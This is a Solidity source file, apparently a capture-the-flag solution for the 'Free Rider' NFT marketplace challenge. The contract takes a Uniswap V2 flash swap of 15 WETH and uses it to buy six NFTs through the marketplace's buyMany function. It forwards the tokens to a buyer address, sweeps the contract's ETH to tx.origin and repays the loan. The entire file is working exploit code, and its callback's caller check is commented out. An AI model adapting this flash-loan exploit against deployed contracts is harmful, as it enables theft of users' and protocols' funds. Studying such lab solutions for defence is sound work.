// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

interface WETH9 {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

interface FreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract freerider_Exploit is IUniswapV2Callee {
    WETH9 weth;
    IUniswapV2Pair pair;
    IERC721 nft;
    FreeRiderNFTMarketplace market;
    address buyer;

    event Log(string message, uint256 val);

    constructor(
        address _weth,
        address _pair,
        address _nft,
        address _market,
        address _buyer
    ) payable {
        require(msg.value >= 0.5 ether);
        pair = IUniswapV2Pair(_pair);
        nft = IERC721(_nft);
        market = FreeRiderNFTMarketplace(_market);
        buyer = _buyer;
        weth = WETH9(_weth);
        weth.deposit{value: 0.5 ether}();
    }

    function exploit() external {
        require(address(pair) != address(0), "!pair");

        address token0 = pair.token0();
        address token1 = pair.token1();
        uint256 amount0Out = address(weth) == token0 ? 15 ether : 0;
        uint256 amount1Out = address(weth) == token1 ? 15 ether : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(address(weth), 15 ether);

        pair.swap(amount0Out, amount1Out, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(
        address _sender,
        uint256 _amount0,
        uint256 _amount1,
        bytes calldata _data
    ) external override {
        // require(msg.sender == address(pair), "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint256 amount) = abi.decode(
            _data,
            (address, uint256)
        );

        // about 0.3%
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256[] memory Ids = new uint256[](6);
        // Ids = [uint256(0), 1, 2, 3, 4, 5];
        for (uint256 i = 0; i < 6; i++) {
            Ids[i] = i;
        }

        weth.withdraw(15 ether);
        market.buyMany{value: 15 ether}(Ids);
        weth.deposit{value: 15 ether}();

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }
        payable(tx.origin).transfer(address(this).balance);

        IERC20(tokenBorrow).transfer(address(pair), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
